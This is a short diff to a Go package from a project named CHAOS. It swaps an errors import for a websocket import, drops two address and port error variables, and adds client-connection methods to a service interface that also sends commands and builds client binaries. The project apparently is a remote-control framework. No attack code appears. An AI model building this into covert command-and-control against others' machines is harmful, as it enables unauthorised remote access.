@@ -2,7 +2,7 @@ package client
 
 import (
 	"context"
-	"errors"
+	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 )
 
@@ -22,12 +22,10 @@ type (
 	}
 )
 
-var (
-	ErrInvalidServerAddress = errors.New("the server address provided is invalid")
-	ErrInvalidServerPort    = errors.New("the server port provided is invalid")
-)
-
 type Service interface {
+	AddClient(clientID string, connection *websocket.Conn) error
+	GetClient(clientID string) (*websocket.Conn, bool)
+	RemoveClient(clientID string) error
 	SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error)
 	BuildClient(BuildClientBinaryInput) (string, error)
 }
